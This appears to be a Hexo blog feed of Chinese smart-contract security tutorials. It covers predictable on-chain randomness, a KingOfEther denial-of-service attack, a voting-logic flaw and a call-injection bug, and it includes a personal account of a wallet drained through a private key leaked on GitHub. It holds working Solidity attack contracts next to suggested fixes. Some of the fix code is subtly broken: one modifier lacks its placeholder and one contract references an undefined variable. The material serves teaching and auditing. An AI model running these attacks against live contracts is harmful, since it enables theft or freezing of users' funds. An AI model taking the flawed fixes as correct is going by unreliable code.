class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract GuessTheRandomNumber &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint _guess) public &#123;</span><br><span class="line">        uint answer = uint(</span><br><span class="line">            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (_guess == answer) &#123;</span><br><span class="line">            (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line">            require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们先来了解一下代码中的两个函数，abi.encodePacked 和 keccak256：</p><ul><li><p>abi.encodePacked 对参数进行编码，solidity 提供两种编码方法 encode 和 encodePacked，前者对每一个参数进行 32 字节补齐，后者不进行补齐而是直接将待编码参数连接起来。</p></li><li><p>keccak256 哈希算法，可以将任意长度的输入压缩成 64 位的 16 进制的数，且哈希碰撞的概率近乎为 0。</p></li></ul><p>接下来我们来看合约代码，这个合约是一个猜数字赢以太的游戏，我们可以看到，部署者使用上个区块的区块哈希和区块时间作为随机数种子生成随机数，我们只需要模拟他的随机数生成方法就可以得到奖励。下面我们来看攻击合约：</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function attack(GuessTheRandomNumber guessTheRandomNumber) public &#123;</span><br><span class="line">        uint answer = uint(</span><br><span class="line">            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        guessTheRandomNumber.guess(answer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们先来分析攻击流程：</p><ol><li>Alice 使用一个以太币部署 GuessTheRandomNumber 合约；</li><li>Eve 部署 Attack 合约调用 attack() 函数并传入 GuessTheRandomNumber 合约的地址；</li><li>Eve 赢得一个以太币。</li></ol><p>这次的攻击可以说是本系列文章创编以来最简单的了，咋回事呢：</p><p>首先，Attack.attack() 模拟了 GuessTheRandomNumber 合约中随机数的生成方式生成随机数后，调用 guessTheRandomNumber.guess() 并将生成的随机数传入，由于从 Attack.attack() 生成随机数到调用 guessTheRandomNumber.guess() 都是在同一区块中完成的，且<strong>在同一区块中 block.number 和 block.timestamp 这两个参数是不变的</strong>，所以，Attack.attack() 和 guessTheRandomNumber.guess() 这两个函数生成的随机数的结果是相同的，从而攻击者可以顺利通过 if(_guess == answer) 判断得到奖励。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>作为开发者</strong></p><p>如果随机数属于非核心业务，可以使用未来区块哈希来生成随机数，也就是将猜数和领奖分开做异步处理。我针对这次的漏洞合约写了一个优化版本，大家可以看下（由于漏洞合约中使用了区块时间和区块哈希来生成一个 256 位的随机数，这无疑很大程度上增加了猜测的难度，对于玩家来说非常的不方便，这里为了契合原漏洞合约我就不做修改了）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract GuessTheRandomNumber &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line">    uint256 public deadline = block.timestamp + 72 hours;</span><br><span class="line">    mapping ( address =&gt; uint256 ) public Answer;</span><br><span class="line"></span><br><span class="line">    modifier isTime()&#123;</span><br><span class="line">        require(block.timestamp &gt; deadline , &quot;Not the time!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Guess(address,uint256);</span><br><span class="line">    event Claim(address);</span><br><span class="line"></span><br><span class="line">    function guess(uint256 _guess) public &#123;</span><br><span class="line">        require(block.timestamp &lt;= deadline , &quot;Too late!&quot;);</span><br><span class="line">        Answer[msg.sender] = _guess;</span><br><span class="line">        emit Guess(msg.sender,_guess);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function claim() public isTime&#123;</span><br><span class="line">        uint256 key = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));</span><br><span class="line">        uint256 answer = Answer[msg.sender];</span><br><span class="line">        require(key == answer , &quot;Sorry,may be next time.&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">        emit Claim(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大家其实可以看到，我添加了 deadline 参数将 guess 和 claim 做了异步处理，在部署合约后的 72 小时内可以调用 guess() 猜随机数，在 72 小时后 guess() 关闭 claim() 开启，玩家可以通过 claim() 来验证自己是否猜中。当然，这个修复合约并不是完美的解决方案，正如前置知识中提到的，如果矿工来玩的话他可以在打包的时候知道自己是否猜中，如果猜中打包上链，如果没有猜中放弃打包（相信没有任何一个矿工愿意为了得到一个以太而付出这么大的代价）。所以最优的解决办法还是接入知名预言机来获取随机数。</p><p><strong>作为审计者</strong></p><p>作为审计者在审计过程中遇到随机数，需要重点关注随机数种子来源，几乎所有使用区块变量都逃不脱被矿工作恶的可能。遇到使用第三方提供的随机数种子时，应提醒项目方确认其来源是否百分百可靠，避免第三方作恶或硬件问题造成损失。在可能的情况下应当建议项目方接入知名预言机来获取安全的随机数。</p><p>引用：<a href="https://mp.weixin.qq.com/s/2_2GsyZ54Vs8Trcbg4766g">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.拒绝服务攻击</title>
      <link href="/2023/06/23/00.security/11.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
      <url>/2023/06/23/00.security/11.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>传统网络安全拒绝服务攻击（DoS）</strong>：DoS 是 Denial of service 的简称，即拒绝服务，任何对服务的干涉，使得其可用性降低或者失去可用性均称为拒绝服务。常见的针对网络协议造成拒绝服务的攻击手段大致有以下几种：SYN Flood，IP 欺骗性攻击，UDP 洪水攻击，Ping 洪流攻击，Teardrop 攻击，Land 攻击，Smurf 攻击，Fraggle 攻击等。</p><p><strong>智能合约拒绝服务攻击</strong>：可以导致智能合约无法正常使用的代码逻辑错误，兼容性错误或调用深度过大（区块链虚拟机的特性）的安全问题。智能合约中的拒绝服务攻击手法就相对比较简单，包括但不限于以下三种：</p><ul><li>基于代码逻辑的拒绝服务攻击：这种类型的拒绝服务攻击一般情况下是因为合约代码逻辑的不严谨造成的，最典型的是：当合约中存在对传入的映射或数组循环遍历的逻辑、没有限制传入的映射或数组的长度时，攻击者可以通过传入超长的映射或者数组进行循环遍历，大量消耗 Gas， 从而该笔交易的 Gas 溢出，最后使得智能合约暂时或永久不可操作。</li><li>基于外部调用的拒绝服务攻击：这种拒绝服务攻击是建立在合约中对外部调用处理不当导致的。例如：智能合约中存在基于外部函数执行的结果来改变合约状态，且没有对交易一直失败的情况做出处理，攻击者会利用这个特点故意使交易失败，智能合约则会一直重复这笔失败的交易，从而造成智能合约逻辑卡在这里不能继续执行，最后使得智能合约暂时或永久不可操作。</li><li>基于运营管理的拒绝服务攻击：这种拒绝服务攻击就是建立在后期运营情况下，例如：在智能合约中通常会存在以 Owner 账户作为管理员角色，该角色通常会持有很高的权限，例如开启或暂停转账功能，当 Owner 角色操作失误或私钥丢失可能会受到非主观意义上的拒绝服务攻击。</li></ul><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><p>通过前置知识相信大家已经对拒绝服务这类攻击有一定的了解了，在触发拒绝服务攻击的三种手法中最典型的就是基于外部调用的拒绝服务攻击。下面我们就通过一段典型的代码示例来带大家深入了解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract KingOfEther &#123;</span><br><span class="line">    address public king;</span><br><span class="line">    uint public balance;</span><br><span class="line"></span><br><span class="line">    function claimThrone() external payable &#123;</span><br><span class="line">        require(msg.value &gt; balance, &quot;Need to pay more to become the king&quot;);</span><br><span class="line">//退钱给旧王</span><br><span class="line">        (bool sent, ) = king.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">//产生新王</span><br><span class="line">        balance = msg.value;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们可以看到上述合约的目的是选取“以太之王”，玩家可以通过 claimThrone() 合约中打入大于之前用户的任意数量的以太币来竞争“以太之王”的称号，当打入的以太币高于之前玩家时打入的以太币留在合约中并获得“以太之王”称号，之前玩家的以太币会原路退回。</p><p>我们可以看到，生成新王和退回旧王的逻辑是在同一函数内完成的，并且 claimThrone() 中还检查了退款的返回值 sent，下面我们来结合这个特点来完成攻击。</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    KingOfEther kingOfEther;</span><br><span class="line"></span><br><span class="line">    constructor(KingOfEther _kingOfEther) &#123;</span><br><span class="line">        kingOfEther = KingOfEther(_kingOfEther);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        kingOfEther.claimThrone&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先我们先来分析攻击流程：</p><ol><li>Alice 部署 KingOfEther 合约。</li><li>Alice 调用 KingOfEther.claimThrone() 发送 1 个以太到 KingOfEther 合约中成为“以太之王”。</li><li>高富帅 Bob 调用 KingOfEther.claimThrone() 发送 2 个以太到 KingOfEther 合约中成为新王。</li><li>Alice 收到 1 个以太币的退款。</li><li>Eve 使用 KingOfEther 的地址部署攻击合约 Attack。</li><li>Eve 调用 Attack.attack() 向 KingOfEther 合约中发送 3 个以太。</li><li>Attack 合约成为新王。</li><li>高富帅 Bob 觉得不服，再次调用 KingOfEther.claimThrone() 向 KingOfEther 合约中发送了 20 个以太展现自己的“钞能力”。</li><li>Bob 发现自己的交易一直被 revert，无法成为新王。至此，Eve 的攻击使 KingOfEther 合约永久失效，Attack 合约成为了永远的“以太之王”。</li></ol><p>高富帅 Bob 觉得不可思议，为啥自己这么有钱还不能称王呢？我们来看看到底是为什么。</p><ol><li>当 Bob 调用 KingOfEther.claimThrone() 发送 20 个以太到 KingOfEther 合约时，会触发 KingOfEther.claimThrone() 的退款逻辑，将之前 Eve 通过 Attack.attack() 向 KingOfEther 合约中发送的 3 个以太原路退回到 Attack 合约。</li><li>我们再来看 Attack 合约，该合约中没有实现 payable 的 fallback() 所以不能接收以太币，这将导致 KingOfEther.claimThrone() 的退款逻辑一直失败，退款返回值 sent 将一直为 false 无法通过 require(sent, “Failed to send Ether”) 检查一直被 revert。</li><li>因为只要触发退款就会被 revert 导致 KingOfEther 合约中继 Attack 合约后无人能成为新王，Eve 成功完成了拒绝服务攻击。</li></ol><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>作为开发者</strong></p><ul><li>在智能合约开发中应当注意处理连续失败的情况，例如将可能出现失败的外部调用逻辑异步处理。</li><li>在使用 call 进行外部调用以及使用循环和遍历时应当注意 Gas 消耗。</li><li>避免对单个角色过度授权的情况，处理合约权限时应做到合理的权限划分，对拥有权限的角色使用多签钱包管理，防止由于私钥泄漏导致权限丢失。</li></ul><p>下面是针对上面漏洞合约的修复示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract KingOfEther &#123;</span><br><span class="line">    address public king;</span><br><span class="line">    uint public KingValue;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function claimThrone() external payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line"></span><br><span class="line">        require(balances[msg.sender] &gt; balance, &quot;Need to pay more to become the king&quot;);</span><br><span class="line">        </span><br><span class="line">        KingValue = balances[msg.sender];</span><br><span class="line">        king = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender != king, &quot;Current king cannot withdraw&quot;);</span><br><span class="line">//这么写防止重入攻击</span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到修复合约中添加了 balances 映射，它记录了每个人向合约中打入以太的总数量，相较于之前合约的优势是玩家失去王位后可以追加以太重新获得王位。修复版本的关键点是将退款逻辑作异步处理，需要玩家手动调用 withdraw() 来自助退款，就算遇到恶意玩家拒收以太也只能影响到自己，不会再造成之前的拒绝服务了。</p><p><strong>作为审计者</strong></p><ul><li><p>内部合约进行分析：</p><ul><li>注意合约中是否存在逻辑上的错误导致影响了可用性。</li><li>注意是否存在由于虚拟机调用深度过大导致的 DoS（深度最大 1024）。</li><li>重点关注在代码逻辑中是否存在大量消耗 Gas 的逻辑。</li></ul></li><li><p>外部合约进行分析：</p><ul><li>关注与外部合约进行交互的时候没有考虑好兼容性的问题，如：未处理 TRC20-USDT 的返回值的兼容性，导致代币被锁定。</li><li>重点检查有没有判断外部合约调用的返回值是否符合预期的效果。</li></ul></li><li>对权限管理进行分析：<ul><li>在审计中需要检查和确认所有函数方法的可见性及调用权限，需要结合项目方提供设计文档在审计中根据设计文档中的描述一一确认权限。如果发现过度授权或权限划分不清晰的需要与项目方交流改进方法，并且与项目方沟通运营操作的流程，确保流程上能够避免合约在运营的时候管理员操作失误或配置错误的情况。</li></ul></li></ul><p>引用：<a href="https://mp.weixin.qq.com/s/SPc96mQs3VO_OdDLKL1Vow">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.我的钱包给盗了!(github盗取私钥)</title>
      <link href="/2023/06/23/00.security/10.GitHub%E0%B8%95%E0%B8%A1%E0%B8%A8%E0%B8%81%E0%B8%AB%E0%B8%9D%E0%B8%B4%E0%B8%9F/"/>
      <url>/2023/06/23/00.security/10.GitHub%E0%B8%95%E0%B8%A1%E0%B8%A8%E0%B8%81%E0%B8%AB%E0%B8%9D%E0%B8%B4%E0%B8%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="我的钱包给盗了！"><a href="#我的钱包给盗了！" class="headerlink" title="我的钱包给盗了！"></a>我的钱包给盗了！</h1><p>这是我的真实经历，哭死 :(</p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>2022年12月14日，这一个夜黑风高的晚上，我打开了视频学习web3js，嗯，视频里面要用小狐狸钱包，然后我打开钱包，发现是0Goerli，有点奇怪，可能我没挂VPN没显示出来。然后我去挂梯子，刷新页面，还是没显示，我还是认为网络的问题，因为如果被盗了应该小狐狸页面应该会有转出记录。</p><p><img src="/2023/06/23/00.security/10.GitHub%E0%B8%95%E0%B8%A1%E0%B8%A8%E0%B8%81%E0%B8%AB%E0%B8%9D%E0%B8%B4%E0%B8%9F/image-20221214232832581.png" alt="image-20221214232832581"></p><p>然而尝试了多次，还是0测试币，纳闷了，然后我访问浏览器，发现惊人一幕：我的钱给转出去了！</p><p><img src="/2023/06/23/00.security/10.GitHub%E0%B8%95%E0%B8%A1%E0%B8%A8%E0%B8%81%E0%B8%AB%E0%B8%9D%E0%B8%B4%E0%B8%9F/image-20221214232947729.png" alt="image-20221214232947729"></p><p>盗我账户的用户</p><p><img src="/2023/06/23/00.security/10.GitHub%E0%B8%95%E0%B8%A1%E0%B8%A8%E0%B8%81%E0%B8%AB%E0%B8%9D%E0%B8%B4%E0%B8%9F/image-20221214234540346.png" alt="image-20221214234540346"></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>钱包被盗这事情一直是听说，现在终于落到我头上了。我没多慌，只是觉得太倒霉了，应该是我哪里出了问题。然后我开始找问题出在哪</p><p>首先，我记得我写的文章里面，将etherscan的API key和ALCHEMY_API_KEY公之于众过，但是仅靠这两个东西是无法盗取钱包账户的</p><p>然后，我看时间线，我在4天之前根据一个活动获取了10goerli测试币，在那之后的2天，就被盗了，我估计是不是那个是钓鱼的活动？然后我就问了也参与了这个活动的人，他们都没有被盗（如果因为我分享给他们这个活动导致他们被盗，我实在过意不去）。那么这个可能性也排除了</p><p>之后，我在想是不是我点了什么钓鱼链接呢？我想了一下也不可能，我这几天没有点过任何陌生的链接，不可能进入了钓鱼链接和网站。</p><p>问了一些人，他们都认为是私钥泄露。有个人说是不是我将私钥放到了GitHub上了？在我印象中，我是没有放过私钥到GitHub上的。但是没有思路了，只能将GitHub仓库检查一遍</p><p><strong>检查GitHub仓库发现问题</strong></p><p><img src="/2023/06/23/00.security/10.GitHub%E0%B8%95%E0%B8%A1%E0%B8%A8%E0%B8%81%E0%B8%AB%E0%B8%9D%E0%B8%B4%E0%B8%9F/image-20221214234007457.png" alt="image-20221214234007457"></p><p>问题找到了：私钥泄露<br>我把GitHub仓库看了一遍，发现我很久之前的一个练习里面写了私钥，那时候刚学solidity写了私钥都没注意，时间太长我都不记得了。虽然10月份将共有库改为私有，但是私钥早就被获取了。<br>应该是那个人一直在监控我的账户（应该也有其他跟我一样的受害者被监控），然后4天之前我的账户转入10测试币，他检测到了，2天之前他就转走<br>我猜测它的手法应该是扫描GitHub上所有有关solidity、web3的仓库，然后爬虫之类的东西进行扫描获取私钥</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>永远不要将私钥放到网络上，私钥一定要保存好</li><li>警惕钓鱼网站和链接</li><li>创建多个钱包，不要将所有鸡蛋放到同一个篮子里</li></ul><p>损失10个测试币并不是什么大事，但这是一个很好的经历</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.业务逻辑漏洞</title>
      <link href="/2023/06/23/00.security/09.%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/23/00.security/09.%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h1><p>这个合约原本想要的逻辑是这样的：</p><ol><li>我去调用83行的vote进行投票。传入一个yays，yays是yes的复数，即我需要传入一个数组，记录我要投谁票，比如传入1-3-4-7-9。</li><li>然后vote调用etch，将我们传入是数组进行hash，记录这个hash。第一个require：投票数不可以超过一定值，第二个require：你要按顺序传入，比如：1-3-4-7-9不可以写成1-4-3-7-9。</li><li>再调用91行的vote：下一次投票之前减去上一次投票的权重。有多少权重就投多少票，然后传入全局变量中。</li></ol><p><img src="/2023/06/23/00.security/09.%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20221210220057049.png" alt="image-20221210220057049"></p><p><img src="/2023/06/23/00.security/09.%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20221210222426730.png" alt="image-20221210222426730"></p><p>但是我们有一个攻击的逻辑思路：</p><ol><li><code>bytes32 hash = keccak256(abi.encodePacked(yays))</code>我们在链下就可以算出。即：提案库的索引我们可以提前算出来</li><li>我们要攻击一个之前已经投过票的提案。比如我们要攻击提案7，我们需要预先准备一个提案1998（乱编的）。我们把提案7和提案1998拼在一起作为yays。yays我们可以提前算出来（假设算出的值是A）</li><li>把A作为参数调用91行的vote方法。也就是说，我们可以不通过86,87行的代码，就可以算出91行的形参。我们在链下就可以做到链上的操作。</li><li>因为我们1998这个提案并不存在提案库当中</li><li>因为提案1998根本不存在，因此<code>addWeight</code>和<code>subWeight</code>算出来的yays为0。因此票数不会增加也不会减少</li><li>到这一步为止，我们完成的事情：votes[msg.sender] = slate：将这个值设置为我们提前算出来的索引，这个索引在提案库中根本不存在。</li><li>然后我们调用etch，将我们提前算出来的索引塞进<code>slates[hash] = yays</code>。这就形成了一个局面：提案库中的索引指向：提案7和根本不存在的提案1998，并且这个索引没人投过票</li><li>调用free方法。因为我们调用了free方法，假设我们直接将这个提案7的票数退票至0，退了其他人的票。那么其他人调用free方法退票的时候，就会卡死在free方法的地64行代码中(因为两个数相减是负数，报错，回滚)。</li><li>造成了投过票的用户无法收回选票！</li></ol><p><img src="/2023/06/23/00.security/09.%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20221210222845932.png" alt="image-20221210222845932"></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.注入漏洞</title>
      <link href="/2023/06/23/00.security/08.%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/23/00.security/08.%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h1><p>这个方法的形参_extraData可以注入任意的数据。比如：假如这个合约生成代币，并且有一个方法<code>transfer(_to,_value)</code>，那么我们可以通过这个地方进行攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function approveAndCallcode(address _spender,uint256 _value,bytes _extraData) returns (bool succcess)&#123;</span><br><span class="line">allowed[msg.sender][_spender] = _value;</span><br><span class="line">Approval(msg.sender,_spender,_value);</span><br><span class="line"></span><br><span class="line">//Call the contract code</span><br><span class="line">if(!_spender.call(_extraData))&#123;</span><br><span class="line">revert;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对下图的说明：</p><ul><li>5a9bXXXXX是这个问题合约的地址，因为这个合约还在用，因此隐去相关信息</li><li>攻击的结果：从合约地址向我的地址160个代币（因为单位问题是0.几几16）</li><li>MethodID：这个方法的函数签名</li><li>【0】：合约的地址</li><li>【1】：因为我们要对if中的call漏洞进行攻击，所以_value没什么意义，设置为0</li><li>【2】：类如bytes、string和数组这一类参数，没固定长度。60是offset，即偏移量。我们可以知道，【0】的偏移量是0，【1】的偏移量是256bits，即32bytes，换成16进制就是20bytes。同理【2】的偏移量是40。同理【3】的偏移量是60。</li><li>【3】：44是bytes _extraData的长度。即从a9059cbb一直到000000a0，一共44bytes(16进制)。</li><li>【4】：前面4字节是<code>transfer(_to,_value</code>)的函数签名。</li><li>【5】【6】：因为函数签名的缘故，这两个位置的数据不整齐，其实也是32bytes（10进制）。后面补0。</li></ul><p><img src="/2023/06/23/00.security/08.%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20221210214025031.png" alt="image-20221210214025031"></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.重入&amp;存储溢出&amp;类型存储计算</title>
      <link href="/2023/06/23/00.security/07.%E9%87%8D%E5%85%A5&amp;%E5%AD%98%E5%82%A8%E6%BA%A2%E5%87%BA&amp;%E7%B1%BB%E5%9E%8B%E5%AD%98%E5%82%A8%E8%AE%A1%E7%AE%97/"/>
      <url>/2023/06/23/00.security/07.%E9%87%8D%E5%85%A5&amp;%E5%AD%98%E5%82%A8%E6%BA%A2%E5%87%BA&amp;%E7%B1%BB%E5%9E%8B%E5%AD%98%E5%82%A8%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="重入-amp-存储溢出-amp-类型存储计算"><a href="#重入-amp-存储溢出-amp-类型存储计算" class="headerlink" title="重入&amp;存储溢出&amp;类型存储计算"></a>重入&amp;存储溢出&amp;类型存储计算</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：check合约获得100分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 